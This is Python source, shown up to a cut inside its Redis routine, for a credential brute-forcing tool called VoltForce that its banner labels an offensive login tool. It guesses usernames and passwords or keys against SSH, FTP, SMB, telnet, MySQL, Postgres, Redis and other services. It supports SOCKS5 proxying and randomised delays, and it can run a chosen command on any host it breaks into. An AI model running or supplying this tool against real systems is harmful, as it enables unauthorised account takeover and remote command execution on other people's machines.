import paramiko
import threading
import time
import sys
import argparse
import socket
import datetime
from ftplib import FTP,error_perm, error_temp, error_reply
from impacket.smbconnection import SMBConnection # Windows defender may block this library
import telnetlib3
import pymysql
import psycopg2
import redis
from pymongo import MongoClient
import pymongo.errors
import poplib
import os
from colorama import Fore,init,Style,Back
from tqdm import tqdm
import socks
from random import SystemRandom,shuffle,seed
from concurrent.futures import ThreadPoolExecutor, as_completed
import asyncio

init(autoreset=True)

class VoltForce:
    def __init__(self,
                 
                target_host : str,          
                 passwords_list=str,   
                 usernames_list=str,
                 timeout=0,
                 threads=10,
                 progress_bar=False,
                 no_progress_bar=False,
                 port=22,
                 max_retries=False,         
                 output_file=None,
                 no_log=False,
                 max_time=False,
                 mode = "ssh",
                 log_mode=None,
                 stop_on_success=True,
                 socks5_address=None,
                 socks5_port=None,
                 socks5_username=None,
                 socks5_password=None,
                 hosts_list=None,
                single_password=None,
                single_username=None,
                no_color=False,
                ssh_key=None,
                keys_list=None,
                random_timeout=None,
                host_timeout=None,
                ignore_errors=False,
                success_only=False,
                delay=0,
                is_shuffle=False,
                shuffle_count=10,
                shuffle_seed=False,
                quiet=False,
                banner=False,
                save_results=False,
                general_wordlist=False,
                keep_open=False,
                exec=False,
                no_banner=False,
                timer=False,
                reverse_usernames=False,
                reverse_passwords=False,
                 min_length_username = False,
                max_length_username = False,
                min_length_password = False,
                max_length_password = False,
                no_duplicates=False,
                delay_between=0
                                ):
        
        self.target_host = target_host
        self.port = port
        self.timeout = timeout
        self.threads = threads

        self.progress_bar = progress_bar
        self.no_progress_bar = no_progress_bar

        self.hosts = hosts_list
        self.single_password= single_password
        self.single_username= single_username 

        self.passwords_list_path = None
        self.usernames_list_path = None
        self.passwords_list = None
        self.usernames_list = None
        self.no_color = no_color

        self.socks5_address= socks5_address
        self.socks5_port = socks5_port
        self.socks5_username = socks5_username
        self.socks5_password = socks5_password

        self.ssh_key = ssh_key
        self.keys_list = keys_list

        self.random_timeout = random_timeout
        self.host_timeout = host_timeout
        self.ignore_errors = ignore_errors
        self.success_only = success_only

        self.delay = delay

        self.is_shuffle = is_shuffle
        self.shuffle_count = shuffle_count
        self.shuffle_seed = shuffle_seed

        self.quiet = quiet
        self.banner = banner
        self.save_results = save_results
        self.general_wordlist = general_wordlist
        self.usernames_list = []
        self.passwords_list = []

        self.reader = None
        self.writer = None
        self.connections_lock = threading.Lock()

        self.keep_open = keep_open
        self.exec = exec

        self.no_banner = no_banner

        self.timer = timer
        self.start_timer = None
        
        self.reverse_usernames=reverse_usernames
        self.reverse_passwords=reverse_passwords

        self.min_length_username =  min_length_username
        self.max_length_username = max_length_username

        self.min_length_password =  min_length_password
        self.max_length_password = max_length_password

        self.filtered_usernames = None
        self.filtered_passwords = None

        

        self.no_duplicates = no_duplicates


        if self.socks5_address and self.socks5_port:

                socks.set_default_proxy(
                    socks.SOCKS5,
                    self.socks5_address,
                    self.socks5_port,
                    username=self.socks5_username,
                    password=self.socks5_password
                )
                
                socket.socket = socks.socksocket

        if self.hosts is None:
            self.hosts = [self.target_host]



        if self.general_wordlist:

            with open(self.general_wordlist, "r") as f:
                for line in f:
                    if ":" in line:
                        user, password = line.strip().split(":", 1)
                        self.usernames_list.append(user)
                        self.passwords_list.append(password)






        if self.single_password:
            self.passwords_list = [self.single_password]
            self.passwords_list_path = f"single: {self.single_password}"

        elif passwords_list is not None:
            with open(passwords_list, "r") as f:
                self.passwords_list = [line.rstrip() for line in f.readlines()]
            self.passwords_list_path = passwords_list

        else:
            self.passwords_list = []
            self.passwords_list_path = None

        if self.single_username:
            self.usernames_list = [self.single_username]
            self.usernames_list_path = f"single: {self.single_username}"

        elif usernames_list is not None:

            with open(usernames_list, "r") as f:
                self.usernames_list = [line.rstrip() for line in f.readlines()]
            self.usernames_list_path = usernames_list

        else:
            self.usernames_list = []
            self.usernames_list_path = None

        self.max_retries = max_retries
        self.total_connections = 0
        self.output_file = output_file
        self.no_log = no_log
        self.max_time = max_time
        self.mode = mode
        self.log_mode = log_mode
        self.stop_on_success = stop_on_success

        self.stop_timer = None
        self.is_timer_stop = False
        self.current_file = os.path.abspath(__file__)
        self.project_folder = os.path.dirname(self.current_file)

        self.ssh_client = None
        self.ftp = None
        self.smbconnection = None
        self.telnet = None
        self.mysql_connection = None
        self.postgres_connection = None
        self.redis_connection = None
        self.mongodb_connection = None
        self.pop_connection = None
        self.delay_between = delay_between

        self.low = None
        self.high = None

        self.stdin = None
        self.stdout = None
        self.stderr = None
        self.error = None
        self.output = None
        self.result = None
        self.cursor = None
        self.elapsed = None
        self.loop = None
        self.success = None


        self.lock = threading.Lock()
        self.stoping_event = threading.Event()
        self.tasks = None
        self.futures = None
        self.output_lock = threading.Lock()

        self.host_locks = {host: threading.Lock() for host in self.hosts}
        self.host_last_attempt = {host: 0 for host in self.hosts}


    
        if self.max_time:
            self.stop_timer = threading.Timer(self.max_time, self.max_time_exit_program)
            self.stop_timer.start()

        self.modes = {
            
                      "ssh" : self.brute_ssh,
                      "ftp" : self.brute_ftp,
                      "smb" : self.brute_smb,
                      "telnet" : self.brute_telnet,
                      "mysql" : self.brute_mysql,
                      "postgres" : self.brute_postgres,
                      "redis" : self.brute_redis,
                      "mongodb" : self.brute_mongodb,
                      "pop3" : self.brute_pop3,
                      "ssh-key" : self.brute_ssh_with_keys         
                      }
        
        if self.passwords_list is None:
            self.passwords_list = []
        

        if random_timeout:

            self.random_timeout = self.parse_range(random_timeout)

        else:

            self.random_timeout = None



        if self.quiet:
            
            if self.output_file:
                pass

            else:
                self.output_file = "./logs/{datetime.datetime.now().strftime('%d_%m_%Y_%H_%M_%S')}_logs.txt"
  


        self.title = rf"""
 _    __      ____     ______                   
| |  / /___  / / /_   / ____/___  _____________  Made by Vesel4ak31 
| | / / __ \/ / __/  / /_  / __ \/ ___/ ___/ _ \ Version 1.0
| |/ / /_/ / / /_   / __/ / /_/ / /  / /__/  __/ Github: https://github.com/vesel4akProjects/VoltForce
|___/\____/_/\__/  /_/    \____/_/   \___/\___/  Versatile Offensive Login Tool (VOLT)
                                                
                    """

    def update(self) -> None:

        self.check_connections()
        self.check_timer()

    def render_text(self, message_type : str , message_type_color , message : str) -> str:

        if self.quiet:
            
            return ""
        
        if message_type == "SUC" and self.success_only:
                
                if self.no_color:

                    return f"[{message_type}] {message}"
                
                return "[" + message_type_color + f"{message_type}" + Style.RESET_ALL + "] " + f"{message}" + Style.RESET_ALL
                

        if message_type == "ERR" and self.ignore_errors:
                
                return "[" + Style.BRIGHT + Fore.YELLOW + f"SKP" + Style.RESET_ALL + "] " + f"error skipped..." + Style.RESET_ALL

        if self.no_color:

            return f"[{message_type}] {message}"
        return "[" + message_type_color + f"{message_type}" + Style.RESET_ALL + "] " + f"{message}" + Style.RESET_ALL
        

    def safe_print(self, message : str):

        with self.output_lock:
            print(message)

    def check_flags(self,connection : any, close_connector : any) -> bool:

        self.success_exit()

        if close_connector is None:

            close_connector = lambda: None   

        if self.exec:

            self.safe_print(self.render_text("EXEC",Style.BRIGHT + Fore.GREEN,f"try to execute command: {self.exec}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [EXECUTE] [{self.mode.upper()}] try to execute command: {self.exec}")
            time.sleep(self.get_timeout())
            self.safe_print(self.render_text("EXEC",Style.BRIGHT + Fore.GREEN,f"command output: {self.execute_command(connection,self.exec)}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [EXECUTE] [{self.mode.upper()}] command output: {self.execute_command(connection,self.exec)}")

        if self.keep_open:
            
                
            self.keep_connection()
            close_connector()

        else: 

            close_connector()
            self.success_exit()   



    def make_worker(self, host: str, user: str, password: str):

        if self.stoping_event.is_set():

            return

        if self.delay_between > 0:

            with self.host_locks[host]:

                self.elapsed = time.time() - self.host_last_attempt[host]

                if self.elapsed < self.delay_between:
                    time.sleep(self.delay_between - self.elapsed)
                self.host_last_attempt[host] = time.time()

        if self.mode.rstrip().lower() in self.modes:
            self.modes[self.mode](host, user, password)


    def execute_command(self,connection : any,command : str) -> str:

        if self.mode == "ssh" or self.mode == "ssh-key":

            try:

                self.stdin, self.stdout, self.stderr = connection.exec_command(command)
                self.error = self.stderr.read().decode("utf-8")
                self.output = self.stdout.read().decode()
                return self.output
            
            except Exception as e:

                return e
            
        elif self.mode == "telnet":

            try:

                connection.write(command.encode('ascii') + b"\n")
                time.sleep(1)
                self.output = connection.read_very_eager().decode()
                return self.output
            
            except Exception as e:
                return e

        elif self.mode == "redis":

            try:

                self.result = connection.execute_command(*command.split())
                return str(self.result)
            
            except Exception as e:

                return f"{e}"
            
        elif self.mode == "mysql":

            try:

                self.cursor = connection.cursor()
                self.cursor.execute(command)
                self.result = self.cursor.fetchall()
                self.cursor.close()
                return str(self.result)
            
            except Exception as e:

                return f"{e}"

        elif self.mode == "postgres":

            try:

                self.cursor = connection.cursor()
                self.cursor.execute(command)
                self.result = self.cursor.fetchall()
                self.cursor.close()
                return str(self.result)
            
            except Exception as e:

                return f"{e}"
            




    def sort_data(self) -> bool:

        if self.min_length_password or self.max_length_password:

            self.filtered_passwords = []

            for password in self.passwords_list:

                if self.min_length_password and len(password) < self.min_length_password:
                    continue

                if self.max_length_password and len(password) > self.max_length_password:
                    continue

                self.filtered_passwords.append(password)

            self.passwords_list = self.filtered_passwords

            print(self.render_text("INF", Fore.GREEN, f"filtered passwords/keys: {len(self.passwords_list)} remaining"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [FILTER PASSOWRDS/KEYS] [{self.mode.upper()}] filtered passwords/keys: {len(self.passwords_list)} remaining")


        if self.min_length_username or self.max_length_username:

            self.filtered_usernames = []

            for username in self.usernames_list:

                if self.min_length_username and len(username) < self.min_length_username:
                    continue

                if self.max_length_username and len(username) > self.max_length_username:
                    continue

                self.filtered_usernames.append(username)

            self.usernames_list = self.filtered_usernames

            print(self.render_text("INF", Fore.GREEN, f"filtered usernames: {len(self.passwords_list)} remaining"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [FILTER USERNAMES] [{self.mode.upper()}] filtered usernames: {len(self.passwords_list)} remaining")


        return True


    def remove_duplicates(self) -> bool:


        self.usernames_list = list(dict.fromkeys(self.usernames_list))
        self.passwords_list = list(dict.fromkeys(self.passwords_list))
        print(self.render_text("INF", Fore.GREEN, f"duplicates was removed..."))
        self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] duplicates was removed...")
        return True

    def keep_connection(self) -> bool:

        try:

            self.safe_print(self.render_text("INF", Fore.GREEN, f"connection kept open , press Ctrl+C to close..."))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] connection kept open , press Ctrl+C to close...")
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
        
            self.safe_print(self.render_text("INF", Fore.GREEN, f"closing connection..."))
            return True

    def save_results_output(self,string : str) -> bool:
        
        if self.save_results:

            with open(self.save_results, self.log_mode or "a", encoding="utf-8") as log_file:

                log_file.write(f"{string}\n")

            return True
        
        return True
        

    def parse_range(self, value: str) -> list:

        try:

            self.low , self.high = float(value.split('-')[0]) , float(value.split('-')[1])

            if len(value.split('-')) != 2:

                raise ValueError("Expected format: min-max")
            
            
            if self.low < 0 or self.high < 0:
                raise ValueError("Values must be positive")
            
            if self.low > self.high :

                raise ValueError("Low value cannot be greater than high value")
            
            return [self.low, self.high]
        
        except ValueError as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"invalid range format: {e} . expected: min-max (e.g., 0.5-2.5)"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] invalid range format: {e} . expected: min-max (e.g., 0.5-2.5)")
            sys.exit(1)


    def get_timeout(self) -> float:

        if self.random_timeout:
            
            return SystemRandom().uniform(self.random_timeout[0],self.random_timeout[1])
        
        return self.timeout

    def check_timer(self) -> bool:

        if self.is_timer_stop:
                
                self.stop_timer.cancel()

                sys.exit(0)
        
    def max_time_exit_program(self):


        self.safe_print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,f"the runtime limit of {Style.BRIGHT + Fore.BLUE + str(self.max_time) + Style.RESET_ALL} seconds has been exceeded"))
        self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] The runtime limit of {self.max_time} seconds has been exceeded")
        self.is_timer_stop = True
        self.stoping_event.set()
        os._exit(0)
        

    def success_exit(self) -> bool:
            
            if self.stop_on_success:

                self.stoping_event.set()
                self.safe_print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,"stop on success enabled, exiting...."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Stop on success enabled, exiting.....")
                os._exit(0)

            else:

                self.safe_print(self.render_text("WAR", Style.BRIGHT + Fore.YELLOW,
                                                "credentials found but stop-on-success is disabled. continuing..."))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Credentials found but stop-on-success is disabled. Continuing...")

            self.stoping_event.set()
            return True


    def check_connections(self):

        if self.max_retries and self.max_retries == self.total_connections:
            
            self.stoping_event.set()
            self.safe_print(self.render_text("INF",Style.BRIGHT + Fore.GREEN,f"maximum number of reconnections reached: {Style.BRIGHT + Fore.WHITE + str(self.max_retries)}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [INFORMATION] [{self.mode.upper()}] Maximum number of reconnections reached: {self.max_retries}")
            os._exit(0)

    def brute_ssh(self,host : str,user : str,password : str) -> bool:
        self.update()

        if self.stoping_event.is_set():
            return False

        try:

            if self.stoping_event.is_set():
                return False

            if self.output_file:
                paramiko.util.log_to_file(self.output_file)

            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.load_system_host_keys()
            self.ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing ssh credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing SSH credentials {user}:{password}")
            
            if self.stoping_event.is_set():
                return False
            
            
            self.ssh_client.connect(hostname=host,
                                            port=self.port,
                                            username=user,
                                            password=password,
                                            timeout=self.get_timeout() or 30
                                            )
            
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"ssh credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.stoping_event.set()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SSH CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1

            self.check_flags(self.ssh_client,self.ssh_client.close())

        except paramiko.AuthenticationException as e:
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] SSH error: {e}")

        finally:

            if self.ssh_client:
                self.ssh_client.close()

    

        
    def brute_ftp(self,host : str,user : str,password : str) -> bool:
        self.update()

        if self.stoping_event.is_set():
                return False
        


        try:

            if self.stoping_event.is_set():
                return False


            self.ftp = FTP()
            time.sleep(self.get_timeout())
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing ftp credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing FTP credentials {user}:{password}")
            self.ftp.connect(host,self.port)   

            if self.stoping_event.is_set():
                return False
     
            self.ftp.login(user, password)
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"ftp credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] FTP CREDENTIALS FOUND {user}:{password}")
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] FTP CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1

            self.check_flags(self.ftp,self.ftp.quit())
                
                
        except error_perm as e:
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] FTP perm error: {e}")

        except error_temp as e:
            
            self.safe_print(self.render_text("ERR",Back.RED,f"temporary ftp server error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Temporary FTP server error: {e}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            return False

        except error_reply as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"ftp server response error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] FTP server response error: {e}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            return False
    
            


        except ConnectionRefusedError:

            self.safe_print(self.render_text("ERR",Back.RED,f"failed to connect to ftp {host}:{self.port} - port is closed or server is not running"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Failed to connect to FTP {host}:{self.port} - port is closed or server is not running")
            
            with self.connections_lock:
                self.total_connections += 1
                
            return False

        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"ftp unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] FTP unknown error: {e}")
            
            with self.connections_lock:
                self.total_connections += 1

        finally:

            if self.ftp:
                self.ftp.quit()
                


    def brute_smb(self,host : str,user : str,password : str) -> bool:
        self.update()

        if self.stoping_event.is_set():
                return False
        
       
        try:

            if self.stoping_event.is_set():
                return False

            time.sleep(self.get_timeout())
            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing smb credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing SMB credentials {user}:{password}")
            self.smbconnection = SMBConnection(host, host, sess_port=self.port)

            if self.stoping_event.is_set():
                return False
            
            self.smbconnection.login(user, password)
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"smb credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SMB CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] SMB CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.check_flags(self.smbconnection,self.smbconnection.logoff())
                
            
        except Exception as e:

                        
                         
            if "STATUS_LOGON_FAILURE" in str(e):
                pass

            elif "STATUS_ACCOUNT_LOCKED_OUT" in str(e):
                    
                    self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"smb account locked: {str(e)}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] SMB account locked: {str(e)}")
                
            else:
                    
                    self.safe_print(self.render_text("ERR",Back.RED,f"smb unknown error: {e}"))
                    self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] SMB unknown error: {e}")

            
            with self.connections_lock:
                self.total_connections += 1
                

        finally:

            try:

                if self.smbconnection:
                    self.smbconnection.logoff()

            except:
                pass


                    
                    
    def brute_telnet(self, host: str, user: str, password: str) -> bool:

        if self.stoping_event.is_set():

            return

        async def _try():

            try:

                
                if self.stoping_event.is_set():
                    return False


                self.reader, self.writer = await telnetlib3.open_connection(host, self.port)

                await asyncio.sleep(0.3)


                self.writer.write(user + '\r\n')
                await asyncio.sleep(0.3)
                await asyncio.wait_for(self.reader.read(4096), timeout=5)
                self.writer.write(password + '\r\n')
                await asyncio.sleep(0.3)
                self.output = await asyncio.wait_for(self.reader.read(4096), timeout=5)
                self.writer.close()

                if b"incorrect" in self.output.lower() or b"invalid" in self.output.lower():
                    return False
                
                return True
            
            except Exception:

                return False

        try:

            if self.stoping_event.is_set():
                    return False

            self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing telnet credentials {user}:{password}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing Telnet credentials {user}:{password}")

            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.success = self.loop.run_until_complete(_try())
            self.loop.close()

            if self.success:

                self.stoping_event.set()
                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"telnet credentials found {user}:{password}"))
                self.success_exit()
                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Telnet CREDENTIALS FOUND {user}:{password}")
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Telnet CREDENTIALS FOUND {user}:{password}")
                
                with self.connections_lock:

                    self.total_connections += 1

                self.check_flags(self.telnet, None)

            else:

                 
                with self.connections_lock:

                    self.total_connections += 1
                    

        except Exception as e:

            self.safe_print(self.render_text("ERR", Back.RED, f"telnet error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Telnet error: {e}")
             
            with self.connections_lock:

                self.total_connections += 1
                    




    def brute_mysql(self,host : str,user : str,password : str) -> bool:
        self.update()

        if self.stoping_event.is_set():
                    return False
        
        try:

            if self.stoping_event.is_set():
                    return False

            self.mysql_connection = pymysql.connect(
                        host=host,
                        port=self.port or 3306,
                        user=user,
                        password=password,
                        connect_timeout=self.get_timeout() or 10
                    )
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"mysql credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MySQL CREDENTIALS FOUND {user}:{password}")
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] MySQL CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.check_flags(self.mysql_connection,self.mysql_connection.close())
                
                
                
        except pymysql.err.OperationalError as e:
            errcode = e.args[0]
            
            if errcode == 1045:  
                
                self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing mysql credentials {user}:{password}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing MySQL credentials {user}:{password}")
            

            elif errcode == 2003:
                
                self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to mysql server on {self.target_host}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to MySQL server on {self.target_host}")

            elif errcode == 1129:
            
                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"host {self.target_host} is blocked by mysql server"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Host {self.target_host} is blocked by MySQL server")

             
                with self.connections_lock:

                    self.total_connections += 1
                    

        except pymysql.err.InternalError as e:
                
                self.safe_print(self.render_text("ERR",Back.RED,f"mysql internal error: {e}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] MySQL internal error: {e}")
                 
                with self.connections_lock:

                    self.total_connections += 1
                    

        except Exception as e:
            
            self.safe_print(self.render_text("ERR",Back.RED,f"mysql unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] MySQL unknown error: {e}")
            
            with self.connections_lock:

                self.total_connections += 1
                    
                








    def brute_postgres(self,host : str,user : str,password : str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False
       
        try:

            if self.stoping_event.is_set():
                    return False

            self.postgres_connection = psycopg2.connect(
                        host=host,
                        port=self.port or 5432,
                        user=user,
                        password=password,
                        connect_timeout=self.get_timeout() or 10
                    )   
            self.stoping_event.set()
            self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"postgres credentials found {Style.BRIGHT + Fore.GREEN + user}:{Style.BRIGHT + Fore.GREEN + password}"))
            self.success_exit()
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Postgres CREDENTIALS FOUND {user}:{password}")
            self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Postgres CREDENTIALS FOUND {user}:{password}")
            
            with self.connections_lock:
                self.total_connections += 1
                
            self.check_flags(self.postgres_connection,self.postgres_connection.close())

                
            
                
        except psycopg2.OperationalError as e:
            err = str(e).lower()

            if "password authentication failed" in err or "role" in err:  
                
                self.safe_print(self.render_text(datetime.datetime.now().strftime('%H:%M:%S'),Style.BRIGHT + Fore.BLUE,f"testing postgres credentials {user}:{password}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [TESTING] [{self.mode.upper()}] Testing Postgres credentials {user}:{password}")
                
                with self.connections_lock:
                    self.total_connections += 1
                

            elif "connection refused" in err or "could not connect" in err:  


                self.safe_print(self.render_text("ERR",Back.RED,f"can't connect to postgres server on {self.target_host}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Can't connect to Postgres server on {self.target_host}")
                
                with self.connections_lock:
                    self.total_connections += 1
                

            elif "timeout" in err:  


                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"postgres connection timeout on {self.target_host}"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Postgres connection timeout on {self.target_host}")

            elif "pg_hba.conf" in err: 

                self.safe_print(self.render_text("WAR",Style.BRIGHT + Fore.YELLOW,f"host {self.target_host} is not allowed in pg_hba.conf"))
                self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [WARNING] [{self.mode.upper()}] Host {self.target_host} is not allowed in pg_hba.conf")

             
                with self.connections_lock:

                    self.total_connections += 1
                    

        except psycopg2.InternalError as e:
            
            self.safe_print(self.render_text("ERR",Back.RED,f"postgres internal error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Postgres internal error: {e}")
             
            with self.connections_lock:

                self.total_connections += 1
                    

        
        except Exception as e:

            self.safe_print(self.render_text("ERR",Back.RED,f"postgres unknown error: {e}"))
            self.logging(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [ERROR] [{self.mode.upper()}] Postgres unknown error: {e}")
             
            with self.connections_lock:
                self.total_connections += 1
                




    def brute_redis(self,host : str, user : str,password : str) -> bool:
        
        self.update()

        if self.stoping_event.is_set():
                    return False

        try:      
                
                if self.stoping_event.is_set():
                    return False
                
                self.redis_connection = redis.Redis(
                    host=host,
                    port=self.port or 6379,
                    password=password.strip(),
                    socket_timeout=self.get_timeout() or 10
                )
                self.stoping_event.set()
                self.redis_connection.ping()
                self.safe_print(self.render_text("SUC",Style.BRIGHT + Fore.GREEN,f"redis password found {Style.BRIGHT + Fore.GREEN + password}"))
                self.success_exit()
                self.save_results_output(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] [SUCCESS] [{self.mode.upper()}] Redis PASSWORD FOUND {password}")
